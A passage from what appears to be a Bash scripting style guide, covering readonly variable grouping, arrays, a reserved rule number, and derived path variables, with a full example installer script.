readonly -- CONFIG_FILE VERBOSE PREFIX
# These don't form a logical group!

# ✓ Correct - group logically related variables
PREFIX=${PREFIX:-/usr/local}
BIN_DIR="$PREFIX"/bin
SHARE_DIR="$PREFIX"/share
readonly -- PREFIX BIN_DIR SHARE_DIR

CONFIG_FILE=config.conf
LOG_FILE=app.log
readonly -- CONFIG_FILE LOG_FILE

# ✗ Wrong - readonly inside conditional (hard to verify)
if [[ -f config.conf ]]; then
  CONFIG_FILE=config.conf
  readonly -- CONFIG_FILE
fi
# CONFIG_FILE might not be readonly if condition is false!

# ✓ Correct - initialize with default, then readonly
CONFIG_FILE=${CONFIG_FILE:-config.conf}
readonly -- CONFIG_FILE
# Always readonly, value might vary
```

**Edge case: Derived variables:**

When variables depend on each other, initialize in dependency order:

```bash
# Base configuration
PREFIX=${PREFIX:-/usr/local}

# Derived paths (depend on PREFIX)
BIN_DIR="$PREFIX"/bin
SHARE_DIR="$PREFIX"/share
LIB_DIR="$PREFIX"/lib

# Make all readonly together
readonly -- PREFIX BIN_DIR SHARE_DIR LIB_DIR

# If you need to recalculate derived values:
# Don't make them readonly until after all calculations
```

**Edge case: Conditional initialization:**

```bash
# Color constants depend on terminal detection
if [[ -t 1 && -t 2 ]]; then
  RED=$'\033[0;31m'
  GREEN=$'\033[0;32m'
  NC=$'\033[0m'
else
  RED=''
  GREEN=''
  NC=''
fi

# Either way, same variables are defined
# Safe to make readonly after conditional
readonly -- RED GREEN NC
```

**Edge case: Arrays in readonly groups:**

```bash
# Can make arrays readonly too
declare -a REQUIRED_COMMANDS=(git make tar)
declare -a OPTIONAL_COMMANDS=(md2ansi pandoc)

# Make both arrays readonly
readonly -a REQUIRED_COMMANDS OPTIONAL_COMMANDS

# Or use -- if not specifying type
readonly -- REQUIRED_COMMANDS OPTIONAL_COMMANDS
```

**Edge case: Delayed readonly (after argument parsing):**

Some variables can only be made readonly after argument parsing:

```bash
#!/bin/bash
set -euo pipefail

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Mutable flags (will be readonly after parsing)
declare -i VERBOSE=0
declare -i DRY_RUN=0

# Mutable configuration (will be readonly after parsing)
declare -- CONFIG_FILE=''
declare -- LOG_FILE=''

main() {
  # Parse arguments (modifies VERBOSE, DRY_RUN, etc.)
  while (($#)); do case $1 in
    -v|--verbose) VERBOSE+=1 ;;
    -n|--dry-run) DRY_RUN=1 ;;
    -c|--config)  noarg "$@"; shift; CONFIG_FILE=$1 ;;
    -l|--log)     noarg "$@"; shift; LOG_FILE=$1 ;;
    *) die 22 "Invalid option ${1@Q}" ;;
  esac; shift; done

  # Now make parsed values readonly
  readonly -- VERBOSE DRY_RUN

  # Optional values: only readonly if set
  [[ -z "$CONFIG_FILE" ]] || readonly -- CONFIG_FILE
  [[ -z "$LOG_FILE" ]] || readonly -- LOG_FILE

  # Rest of script with readonly variables
  ((VERBOSE)) && info 'Verbose mode enabled' ||:
  ((DRY_RUN)) && info 'Dry-run mode enabled' ||:
}

main "$@"
#fin
```

**Testing readonly status:**

```bash
# Check if variable is readonly
if readonly -p 2>/dev/null | grep -q "VERSION"; then
  echo 'VERSION is readonly'
else
  echo 'VERSION is not readonly'
fi

# List all readonly variables
readonly -p

# Attempt to modify readonly variable (for testing)
VERSION=2.0.0  # Will fail: bash: VERSION: readonly variable
```

**When NOT to use readonly:**

```bash
# Don't make readonly if value will change during script execution
declare -i count=0
# count is modified in loops - don't make readonly

# Don't make readonly if conditional assignment
config_file=''
if [[ -f custom.conf ]]; then
  config_file=custom.conf
elif [[ -f default.conf ]]; then
  config_file=default.conf
fi
# config_file might be modified - don't make readonly yet

# Only make readonly when value is final
[[ -z "$config_file" ]] || readonly -- config_file
```

**Summary:**

- **Initialize first, readonly second**: Separate value assignment from protection
- **Group related variables**: Make logically related variables readonly together
- **Use visual separation**: Add blank lines or comments between variable groups
- **Always use `--`**: Prevents option injection bugs
- **Make readonly early**: As soon as values are final and won't change
- **Delayed readonly for args**: Make readonly after argument parsing for flags/options
- **Test readonly status**: Use `readonly -p` to verify

**Key principle:** The "readonly after group" pattern makes immutability contracts explicit and visible. By clearly separating initialization from protection, readers immediately understand which variables are constants and which are mutable.


---


**Rule: BCS0206**

## Readonly Declaration
Use `declare -r` or `readonly` for constants to prevent accidental modification.

```bash
declare -ra REQUIRED=(pandoc git md2ansi)
#shellcheck disable=SC2155 # acceptable; if realpath fails then we have much bigger problems
declare -r SCRIPT_PATH=$(realpath -- "$0")
```


---


**Rule: BCS0207**

## Arrays

**Rule: BCS0207**

Array declaration, usage, and safe list handling.

---

#### Rationale

Arrays provide:
- **Element preservation**: Boundaries maintained regardless of content
- **No word splitting**: `"${array[@]}"` preserves elements exactly
- **Glob safety**: Wildcards in elements are preserved literally
- **Safe command construction**: Build commands with arbitrary arguments

---

#### Declaration

```bash
# Indexed arrays (explicit declaration)
declare -a paths=()           # Empty array
declare -a colors=(red green blue)

# Local arrays in functions
local -a found_files=()

# Associative arrays (Bash 4.0+)
declare -A config=()
config['key']='value'
```

#### Adding Elements

```bash
# Append single element
paths+=("$1")

# Append multiple elements
args+=("$arg1" "$arg2" "$arg3")

# Append another array
all_files+=("${config_files[@]}")
all_files+=("$@")
```

#### Iteration

```bash
# ✓ Correct - quoted expansion, handles spaces
for path in "${paths[@]}"; do
  process "$path"
done

# ✗ Wrong - unquoted, breaks with spaces
for path in ${paths[@]}; do
  process "$path"
done
```

#### Length and Checking

```bash
# Get number of elements
count=${#files[@]}

# Check if empty
if ((${#array[@]} == 0)); then
  info 'Array is empty'
fi

# Set default if empty
((${#paths[@]})) || paths=('.')
```

#### Reading Into Arrays

```bash
# Split string by delimiter
IFS=',' read -ra fields <<< "$csv_line"

# From command output (preferred)
readarray -t lines < <(grep pattern file)
mapfile -t files < <(find . -name "*.txt")

# From file
readarray -t config_lines < config.txt
```

#### Element Access

```bash
# Single element (0-indexed)
first=${array[0]}
last=${array[-1]}           # Bash 4.3+

# All elements
"${array[@]}"               # Each as separate word
"${array[*]}"               # All as single word (rare)

# Slice
"${array[@]:2}"             # From index 2
"${array[@]:1:3}"           # 3 elements from index 1
```

---

#### Safe Command Construction

```bash
# Build command with variable arguments
local -a cmd=(myapp --config "$config_file")

# Add conditional arguments
((verbose)) && cmd+=(--verbose) ||:
[[ -z "$output" ]] || cmd+=(--output "$output")

# Execute safely
"${cmd[@]}"
```

#### Collecting Arguments During Parsing

```bash
declare -a input_files=()
while (($#)); do
  case $1 in
    -*)  handle_option "$1" ;;
    *)   input_files+=("$1") ;;
  esac
  shift
done

# Process collected files
for file in "${input_files[@]}"; do
  process_file "$file"
done
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - unquoted expansion
rm ${files[@]}

# ✓ Correct - quoted expansion
rm "${files[@]}"
```

```bash
# ✗ Wrong - word splitting to create array
array=($string)

# ✓ Correct - explicit
readarray -t array <<< "$string"
```

```bash
# ✗ Wrong - using [*] in iteration
for item in "${array[*]}"; do

# ✓ Correct - use [@]
for item in "${array[@]}"; do
```

---

#### Operator Summary

| Operation | Syntax | Description |
|-----------|--------|-------------|
| Declare | `declare -a arr=()` | Create empty array |
| Append | `arr+=("value")` | Add element |
| Length | `${#arr[@]}` | Number of elements |
| All elements | `"${arr[@]}"` | Each as separate word |
| Single element | `"${arr[i]}"` | Element at index i |
| Last element | `"${arr[-1]}"` | Last element |
| Slice | `"${arr[@]:2:3}"` | 3 elements from index 2 |
| Indices | `"${!arr[@]}"` | All array indices |

**Key principle:** Always quote array expansions: `"${array[@]}"` to preserve spacing and prevent word splitting.


---


**Rule: BCS0208**

## Reserved for Future Use

**Rule: BCS0208**

---

This rule code is reserved for future expansion of the Variables & Data Types section.

#### Purpose

This placeholder exists to:

1. **Maintain numerical sequence integrity** - Ensures BCS codes follow consistent two-digit patterns
2. **Allow future additions** - Provides space for variable-related topics without code renumbering
3. **Prevent external conflicts** - Protects any external references to BCS0208

#### Possible Future Topics

- Nameref variables (`declare -n`)
- Indirect variable expansion (`${!var}`)
- Variable attributes and introspection
- Typed variable best practices

#### Note

Do not use BCS0208 in documentation or compliance checking until this placeholder is replaced with actual content.

---

**Status:** Reserved
**Version:** 1.0.0


---


**Rule: BCS0209**

## Derived Variables

**Derived variables are variables computed from other variables, often for paths, configurations, or composite values. Group derived variables together with clear section comments explaining their dependencies. Document special cases or hardcoded values. When base variables can change (especially during argument parsing), remember to update all derived variables. Derived variables reduce duplication and ensure consistency when base values change.**

**Rationale:**

- **DRY Principle**: Single source of truth for base values, derived everywhere else
- **Consistency**: When PREFIX changes, all paths update automatically
- **Maintainability**: One place to change base value, derivations update automatically
- **Clarity**: Section comments make relationships between variables obvious
- **Flexibility**: Easy to customize base values via arguments or environment
- **Documentation**: Explicit derivation shows intent and dependencies
- **Correctness**: Updating derived variables when base changes prevents subtle bugs

**Simple derived variables:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ============================================================================
# Configuration - Base Values
# ============================================================================

declare -- PREFIX=/usr/local
declare -- APP_NAME=myapp

# ============================================================================
# Configuration - Derived Paths
# ============================================================================

# All paths derived from PREFIX
declare -- BIN_DIR="$PREFIX"/bin
declare -- LIB_DIR="$PREFIX"/lib
declare -- SHARE_DIR="$PREFIX"/share
declare -- DOC_DIR="$PREFIX"/share/doc/"$APP_NAME"

# Application-specific derived paths
declare -- CONFIG_DIR="$HOME"/."$APP_NAME"
declare -- CONFIG_FILE="$CONFIG_DIR"/config.conf
declare -- CACHE_DIR="$HOME"/.cache/"$APP_NAME"
declare -- DATA_DIR="$HOME"/.local/share/"$APP_NAME"

main() {
  echo "Installation prefix: $PREFIX"
  echo "Binaries: $BIN_DIR"
  echo "Libraries: $LIB_DIR"
  echo "Documentation: $DOC_DIR"
}

main "$@"
#fin
```

**Derived paths with environment fallbacks:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ============================================================================
# Configuration - Base Values
# ============================================================================

declare -- APP_NAME=myapp

# ============================================================================
# Configuration - Derived from Environment (XDG Base Directory Specification)
# ============================================================================

# XDG_CONFIG_HOME with fallback to $HOME/.config
declare -- CONFIG_BASE=${XDG_CONFIG_HOME:-"$HOME"/.config}
declare -- CONFIG_DIR="$CONFIG_BASE"/"$APP_NAME"
declare -- CONFIG_FILE="$CONFIG_DIR"/config.conf

# XDG_DATA_HOME with fallback to $HOME/.local/share
declare -- DATA_BASE=${XDG_DATA_HOME:-"$HOME"/.local/share}
declare -- DATA_DIR="$DATA_BASE"/"$APP_NAME"

# XDG_STATE_HOME with fallback to $HOME/.local/state (for logs)
declare -- STATE_BASE=${XDG_STATE_HOME:-"$HOME"/.local/state}
declare -- LOG_DIR="$STATE_BASE"/"$APP_NAME"
declare -- LOG_FILE="$LOG_DIR"/app.log

# XDG_CACHE_HOME with fallback to $HOME/.cache
declare -- CACHE_BASE=${XDG_CACHE_HOME:-"$HOME"/.cache}
declare -- CACHE_DIR="$CACHE_BASE"/"$APP_NAME"

main() {
  echo "Configuration: $CONFIG_DIR"
  echo "Data: $DATA_DIR"
  echo "Logs: $LOG_DIR"
  echo "Cache: $CACHE_DIR"
}

main "$@"
#fin
```

**Updating derived variables when base changes:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ============================================================================
# Configuration - Base Values
# ============================================================================

declare -- PREFIX=/usr/local
declare -- APP_NAME=myapp

# ============================================================================
# Configuration - Derived Paths (initial values)
# ============================================================================

declare -- BIN_DIR="$PREFIX"/bin
declare -- LIB_DIR="$PREFIX"/lib
declare -- SHARE_DIR="$PREFIX"/share
declare -- MAN_DIR="$PREFIX"/share/man
declare -- DOC_DIR="$PREFIX"/share/doc/"$APP_NAME"

# ============================================================================
# Helper Functions
# ============================================================================

noarg() {
  if (($# < 2)) || [[ "$2" =~ ^- ]]; then
    die 22 "Option ${1@Q} requires an argument"
  fi
}

# Update all derived paths when PREFIX changes
update_derived_paths() {
  BIN_DIR="$PREFIX"/bin
  LIB_DIR="$PREFIX"/lib
  SHARE_DIR="$PREFIX"/share
  MAN_DIR="$PREFIX"/share/man
  DOC_DIR="$PREFIX"/share/doc/"$APP_NAME"

  info "Updated paths for PREFIX=${PREFIX@Q}"
}

# ============================================================================
# Main Function
# ============================================================================

main() {
  # Parse arguments
  while (($#)); do
    case $1 in
      --prefix)
        noarg "$@"
        shift
        PREFIX=$1
        # IMPORTANT: Update all derived paths when PREFIX changes
        update_derived_paths
        ;;

      --app-name)
        noarg "$@"
        shift
        APP_NAME=$1
        # DOC_DIR depends on APP_NAME, update it
        DOC_DIR="$PREFIX"/share/doc/"$APP_NAME"
        ;;

      -h|--help)
        echo "Usage: $SCRIPT_NAME [--prefix PREFIX] [--app-name NAME]"
        return 0
        ;;

      *)
        die 22 "Invalid argument ${1@Q}"
        ;;
    esac
    shift
  done

  # Make variables readonly after parsing
  readonly -- PREFIX APP_NAME BIN_DIR LIB_DIR SHARE_DIR MAN_DIR DOC_DIR

  # Display configuration
  info 'Installation Configuration:'
  info "  Prefix: $PREFIX"
  info "  App Name: $APP_NAME"
  info "  Binaries: $BIN_DIR"
  info "  Libraries: $LIB_DIR"
  info "  Documentation: $DOC_DIR"
  info "  Manual Pages: $MAN_DIR"
}

main "$@"
#fin
```

**Complex derivations with multiple dependencies:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ============================================================================
# Configuration - Base Values
# ============================================================================

declare -- ENVIRONMENT=production
declare -- REGION=us-east
declare -- APP_NAME=myapp
declare -- NAMESPACE=default

# ============================================================================
# Configuration - Derived Identifiers
# ============================================================================

# Composite identifiers derived from base values
declare -- DEPLOYMENT_ID="$APP_NAME-$ENVIRONMENT-$REGION"
declare -- RESOURCE_PREFIX="$NAMESPACE-$APP_NAME"
declare -- LOG_PREFIX="$ENVIRONMENT/$REGION/$APP_NAME"

# ============================================================================
# Configuration - Derived Paths
# ============================================================================

# Paths that depend on environment
declare -- CONFIG_DIR=/etc/"$APP_NAME"/"$ENVIRONMENT"
declare -- LOG_DIR=/var/log/"$APP_NAME"/"$ENVIRONMENT"
declare -- DATA_DIR=/var/lib/"$APP_NAME"/"$ENVIRONMENT"

# Files derived from directories and identifiers
declare -- CONFIG_FILE="$CONFIG_DIR"/config-"$REGION".conf
declare -- LOG_FILE="$LOG_DIR"/"$APP_NAME"-"$REGION".log
declare -- PID_FILE=/var/run/"$DEPLOYMENT_ID".pid

# ============================================================================
# Configuration - Derived URLs
# ============================================================================

declare -- API_HOST=api-"$ENVIRONMENT".example.com
declare -- API_URL="https://$API_HOST/v1"
declare -- METRICS_URL="https://metrics-$REGION.example.com/$APP_NAME"

main() {
  info 'Deployment Configuration:'
  info "  Deployment ID: $DEPLOYMENT_ID"
  info "  Resource Prefix: $RESOURCE_PREFIX"
  info "  Config File: $CONFIG_FILE"
  info "  Log File: $LOG_FILE"
  info "  API URL: $API_URL"
  info "  Metrics URL: $METRICS_URL"
}

main "$@"
#fin
```

**Complete example - Configurable installation script:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ============================================================================
# Global Variables - Base Values
# ============================================================================

declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -- PREFIX=/usr/local
declare -- APP_NAME=myapp
declare -- SYSTEM_USER=myapp

# ============================================================================
# Global Variables - Derived Installation Paths
# ============================================================================

# Installation directories derived from PREFIX
declare -- BIN_DIR="$PREFIX"/bin
declare -- LIB_DIR="$PREFIX"/lib/"$APP_NAME"
declare -- SHARE_DIR="$PREFIX"/share/"$APP_NAME"
declare -- MAN_DIR="$PREFIX"/share/man/man1
declare -- DOC_DIR="$PREFIX"/share/doc/"$APP_NAME"

# System directories derived from APP_NAME
declare -- CONFIG_DIR=/etc/"$APP_NAME"
declare -- LOG_DIR=/var/log/"$APP_NAME"
declare -- DATA_DIR=/var/lib/"$APP_NAME"
declare -- RUN_DIR=/var/run/"$APP_NAME"

# Files derived from directories
declare -- MAIN_BINARY="$BIN_DIR"/"$APP_NAME"
declare -- CONFIG_FILE="$CONFIG_DIR"/config.conf
declare -- LOG_FILE="$LOG_DIR"/app.log
declare -- PID_FILE="$RUN_DIR"/"$APP_NAME".pid

# Systemd unit file path (hardcoded - doesn't depend on PREFIX)
declare -- SYSTEMD_DIR=/etc/systemd/system
declare -- SERVICE_FILE="$SYSTEMD_DIR"/"$APP_NAME".service

# ============================================================================
# Messaging Functions
# ============================================================================

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case "${FUNCNAME[1]}" in
    info) prefix+=" ◉" ;;
    warn) prefix+=" ▲" ;;
    error) prefix+=" ✗" ;;
    success) prefix+=" ✓" ;;
    debug) prefix+=" ⋯" ;;
    *) ;;
  esac
  for msg in "$@"; do
    printf '%s %s\n' "$prefix" "$msg"
  done
}

info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn() { >&2 _msg "$@"; }
error() { >&2 _msg "$@"; }
success() { >&2 _msg "$@"; }
debug() { ((VERBOSE >= 2)) || return 0; >&2 _msg "$@"; }

die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# ============================================================================
# Helper Functions
# ============================================================================

noarg() {
  if (($# < 2)) || [[ "$2" =~ ^- ]]; then
    die 22 "Option ${1@Q} requires an argument"
  fi
}

# Update all derived paths when PREFIX changes
update_derived_paths() {
  debug 'Updating derived paths...'

  # Derived from PREFIX
  BIN_DIR="$PREFIX"/bin
  LIB_DIR="$PREFIX"/lib/"$APP_NAME"
  SHARE_DIR="$PREFIX"/share/"$APP_NAME"
  MAN_DIR="$PREFIX"/share/man/man1
  DOC_DIR="$PREFIX"/share/doc/"$APP_NAME"

  # Derived from APP_NAME (PREFIX-independent)
  CONFIG_DIR=/etc/"$APP_NAME"
  LOG_DIR=/var/log/"$APP_NAME"
  DATA_DIR=/var/lib/"$APP_NAME"
  RUN_DIR=/var/run/"$APP_NAME"

  # Derived from directories
  MAIN_BINARY="$BIN_DIR"/"$APP_NAME"
  CONFIG_FILE="$CONFIG_DIR"/config.conf
  LOG_FILE="$LOG_DIR"/app.log
  PID_FILE="$RUN_DIR"/"$APP_NAME".pid
  SERVICE_FILE="$SYSTEMD_DIR"/"$APP_NAME".service

  debug "PREFIX: $PREFIX"
  debug "BIN_DIR: $BIN_DIR"
  debug "CONFIG_DIR: $CONFIG_DIR"
}

# ============================================================================
# Installation Functions
# ============================================================================

# Show installation configuration
show_config() {
  info "$APP_NAME v$VERSION Installation Configuration:"
  echo ''
  info 'Installation Prefix:'
  info "  PREFIX: $PREFIX"
  echo ''
  info 'Binary and Library Paths:'
  info "  Binaries: $BIN_DIR"
  info "  Libraries: $LIB_DIR"
  info "  Shared Files: $SHARE_DIR"
  info "  Manual Pages: $MAN_DIR"
  info "  Documentation: $DOC_DIR"
  echo ''
  info 'System Paths:'
  info "  Configuration: $CONFIG_DIR"
  info "  Logs: $LOG_DIR"
  info "  Data: $DATA_DIR"
  info "  Runtime: $RUN_DIR"
  echo ''
  info 'Key Files:'
  info "  Main Binary: $MAIN_BINARY"
  info "  Config File: $CONFIG_FILE"
  info "  Log File: $LOG_FILE"
  info "  PID File: $PID_FILE"
  info "  Service File: $SERVICE_FILE"
  echo ''
  info 'System User:'
  info "  User: $SYSTEM_USER"
}

# Create installation directories
create_directories() {
  local -a directories=(
    "$BIN_DIR"
    "$LIB_DIR"
    "$SHARE_DIR"
    "$MAN_DIR"
    "$DOC_DIR"
    "$CONFIG_DIR"
    "$LOG_DIR"
    "$DATA_DIR"
    "$RUN_DIR"
  )

  local -- dir
  for dir in "${directories[@]}"; do
    if ((DRY_RUN)); then
      info "[DRY-RUN] Would create directory ${dir@Q}"
    else
      if [[ ! -d "$dir" ]]; then
        debug "Creating directory ${dir@Q}"
        mkdir -p "$dir"
      else
        debug "Directory exists ${dir@Q}"
      fi
    fi
  done
}

# Install files
install_files() {
  if ((DRY_RUN)); then
    info '[DRY-RUN] Would install files to:'
    info "  Binary: $MAIN_BINARY"
    info "  Config: $CONFIG_FILE"
    info "  Service: $SERVICE_FILE"
  else
    info 'Installing files...'

    # Install binary
    debug "Installing binary to: $MAIN_BINARY"
    install -m 755 "$SCRIPT_DIR"/bin/"$APP_NAME" "$MAIN_BINARY"

    # Install config
    if [[ ! -f "$CONFIG_FILE" ]]; then
      debug "Installing config to: $CONFIG_FILE"
      install -m 644 "$SCRIPT_DIR"/config/config.conf "$CONFIG_FILE"
    else
      debug "Config exists, skipping ${CONFIG_FILE@Q}"
    fi

    # Install systemd service
    debug "Installing service to ${SERVICE_FILE@Q}"
    install -m 644 "$SCRIPT_DIR"/systemd/"$APP_NAME".service "$SERVICE_FILE"

    success 'Files installed successfully'
  fi
}

# ============================================================================
# Main Function
# ============================================================================

show_help() {
  cat <<HELP
$SCRIPT_NAME $VERSION - Install myapp

Install myapp with configurable paths.

Usage: install.sh [OPTIONS]

Options:
  -v, --verbose           Verbose output (additive: -vv == debug)                     Very verbose (debug) output
  --prefix PREFIX         Installation prefix (default: /usr/local)
  --app-name NAME         Application name (default: myapp)
  --system-user USER      System user (default: myapp)
  -h, --help              Show this help message
  -V, --version           Show version

Examples:
  $SCRIPT_NAME
  $SCRIPT_NAME --prefix /opt/myapp
  $SCRIPT_NAME --dry-run --verbose
  $SCRIPT_NAME --prefix /usr --system-user webapp
HELP
}

main() {
  # Parse arguments
  while (($#)); do
    case $1 in
      -v|--verbose)
        VERBOSE+=1
        ;;

      -n|--dry-run)
        DRY_RUN=1
        ;;

      --prefix)
        noarg "$@"
        shift
        PREFIX=$1
        # Update all derived paths when PREFIX changes
        update_derived_paths
        ;;

      --app-name)
        noarg "$@"
        shift
        APP_NAME=$1
        # Update paths that depend on APP_NAME
        update_derived_paths
        ;;

      --system-user)
        noarg "$@"
        shift
        SYSTEM_USER=$1
        ;;

      -V|--version)
        echo "$SCRIPT_NAME $VERSION"
        return 0
        ;;

      -h|--help)
        show_help
        return 0
        ;;

      --)
        shift
        break
        ;;

      -*)
        die 22 "Invalid option ${1@Q}"
        ;;

      *)
        die 22 "Unexpected argument ${1@Q}"
        ;;
    esac
    shift
  done

  # Make variables readonly after parsing
  readonly -- VERBOSE DRY_RUN PREFIX APP_NAME SYSTEM_USER
  readonly -- BIN_DIR LIB_DIR SHARE_DIR MAN_DIR DOC_DIR
  readonly -- CONFIG_DIR LOG_DIR DATA_DIR RUN_DIR SYSTEMD_DIR
  readonly -- MAIN_BINARY CONFIG_FILE LOG_FILE PID_FILE SERVICE_FILE

  # Check for root if not dry-run
  if ((DRY_RUN == 0)) && ((EUID)); then
    die 1 'This script must be run as root (or use --dry-run to preview)'
  fi

  # Show configuration
  show_config

  # Create directories
  info 'Creating directories...'
  create_directories

  # Install files
  install_files

  # Success
  ((DRY_RUN)) && info '[DRY-RUN] Installation preview complete' ||:
  ((DRY_RUN)) || success "$APP_NAME $VERSION installed successfully!"
}

main "$@"
#fin
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - duplicating values instead of deriving
PREFIX=/usr/local
BIN_DIR=/usr/local/bin        # Duplicates PREFIX!
LIB_DIR=/usr/local/lib        # Duplicates PREFIX!

# ✓ Correct - derive from base value
PREFIX=/usr/local
BIN_DIR="$PREFIX"/bin           # Derived from PREFIX
LIB_DIR="$PREFIX"/lib           # Derived from PREFIX

# ✗ Wrong - not updating derived variables when base changes
main() {
  case $1 in
    --prefix)
      shift
      PREFIX=$1
      # BIN_DIR and LIB_DIR are now wrong!
      ;;
  esac
}

# ✓ Correct - update derived variables
main() {
  case $1 in
    --prefix)
      shift
      PREFIX=$1
      BIN_DIR="$PREFIX"/bin     # Update derived
      LIB_DIR="$PREFIX"/lib     # Update derived
      ;;
  esac
}

# ✗ Wrong - no comments explaining derivation
CONFIG_DIR="$HOME"/.config/"$APP_NAME"
DATA_DIR="$HOME"/.local/share/"$APP_NAME"
CACHE_DIR="$HOME"/.cache/"$APP_NAME"

# ✓ Correct - section comment explaining derivation
# Derived from $HOME and $APP_NAME
CONFIG_DIR="$HOME"/.config/"$APP_NAME"
DATA_DIR="$HOME"/.local/share/"$APP_NAME"
CACHE_DIR="$HOME"/.cache/"$APP_NAME"

# ✗ Wrong - making derived variables readonly before base
BIN_DIR="$PREFIX"/bin
readonly -- BIN_DIR             # Can't update if PREFIX changes!
PREFIX=/usr/local

# ✓ Correct - make readonly after all values set
PREFIX=/usr/local
BIN_DIR="$PREFIX"/bin
# Parse arguments that might change PREFIX...
readonly -- PREFIX BIN_DIR      # Now make readonly

# ✗ Wrong - complex derivation without comments
DEPLOYMENT="$ENV"-"$REGION"-"$APP"-"$VERSION"-"$COMMIT"

# ✓ Correct - explain complex derivation
# Deployment ID format: environment-region-app-version-commit
DEPLOYMENT="$ENV"-"$REGION"-"$APP"-"$VERSION"-"$COMMIT"

# ✗ Wrong - inconsistent derivation
CONFIG_DIR=/etc/myapp                  # Hardcoded
LOG_DIR=/var/log/"$APP_NAME"             # Derived from APP_NAME
# Inconsistent - either both derived or both hardcoded!

# ✓ Correct - consistent derivation
CONFIG_DIR=/etc/"$APP_NAME"              # Derived
LOG_DIR=/var/log/"$APP_NAME"             # Derived

# ✗ Wrong - circular dependency
VAR1="$VAR2"
VAR2="$VAR1"                             # Circular!

# ✓ Correct - clear dependency chain
BASE='value'
DERIVED1="$BASE"/path1
DERIVED2="$BASE"/path2

# ✗ Wrong - hardcoding derived value that should be flexible
APP_NAME=myapp
CONFIG_FILE=/etc/myapp/config.conf     # Hardcoded!

# ✓ Correct - derive from APP_NAME
APP_NAME=myapp
CONFIG_DIR=/etc/"$APP_NAME"
CONFIG_FILE="$CONFIG_DIR"/config.conf    # Derived
```

**Edge cases:**

**1. Environment variable fallbacks:**

```bash
# XDG Base Directory support with fallbacks
CONFIG_BASE=${XDG_CONFIG_HOME:-"$HOME"/.config}
DATA_BASE=${XDG_DATA_HOME:-"$HOME"/.local/share}
CACHE_BASE=${XDG_CACHE_HOME:-"$HOME"/.cache}
STATE_BASE=${XDG_STATE_HOME:-"$HOME"/.local/state}

# Derived from environment-aware bases
CONFIG_DIR="$CONFIG_BASE"/"$APP_NAME"
DATA_DIR="$DATA_BASE"/"$APP_NAME"
CACHE_DIR="$CACHE_BASE"/"$APP_NAME"
LOG_DIR="$STATE_BASE"/"$APP_NAME"
```

**2. Conditional derivation:**

```bash
# Different paths for development vs production
if [[ "$ENVIRONMENT" == development ]]; then
  CONFIG_DIR="$SCRIPT_DIR"/config
  LOG_DIR="$SCRIPT_DIR"/logs
else
  CONFIG_DIR=/etc/"$APP_NAME"
  LOG_DIR=/var/log/"$APP_NAME"
fi

# Derived from environment-specific directories
CONFIG_FILE="$CONFIG_DIR"/config.conf
LOG_FILE="$LOG_DIR"/app.log
```

**3. Platform-specific derivations:**

```bash
# Detect platform
case "$(uname -s)" in
  Darwin)
    LIB_EXT=dylib
    CONFIG_DIR="$HOME/Library/Application Support/$APP_NAME"
    ;;
  Linux)
    LIB_EXT=so
    CONFIG_DIR="$HOME"/.config/"$APP_NAME"
    ;;
  *)
    die 1 'Unsupported platform'
    ;;
esac

# Derived from platform-specific values
LIBRARY_NAME="lib"$APP_NAME"."$LIB_EXT"
CONFIG_FILE="$CONFIG_DIR"/config.conf
```

**4. Hardcoded exceptions:**

```bash
# Most paths derived from PREFIX
PREFIX=/usr/local
BIN_DIR="$PREFIX"/bin
LIB_DIR="$PREFIX"/lib

# Exception: System-wide profile must be in /etc regardless of PREFIX
# Reason: Shell initialization requires fixed path for all users
PROFILE_DIR=/etc/profile.d           # Hardcoded by design
PROFILE_FILE="$PROFILE_DIR"/"$APP_NAME".sh
```

**5. Multiple update functions:**

```bash
# Update subset of derived variables
update_prefix_paths() {
  BIN_DIR="$PREFIX"/bin
  LIB_DIR="$PREFIX"/lib
  SHARE_DIR="$PREFIX"/share
}

update_app_paths() {
  CONFIG_DIR=/etc/"$APP_NAME"
  LOG_DIR=/var/log/"$APP_NAME"
  DATA_DIR=/var/lib/"$APP_NAME"
}

update_all_derived() {
  update_prefix_paths
  update_app_paths

  # Files derived from directories
  CONFIG_FILE="$CONFIG_DIR"/config.conf
  LOG_FILE="$LOG_DIR"/app.log
}
```

**Summary:**

- **Group derived variables** - with section comments explaining dependencies
- **Derive from base values** - never duplicate, always compute
- **Update when base changes** - especially during argument parsing
- **Document special cases** - explain hardcoded values that don't derive
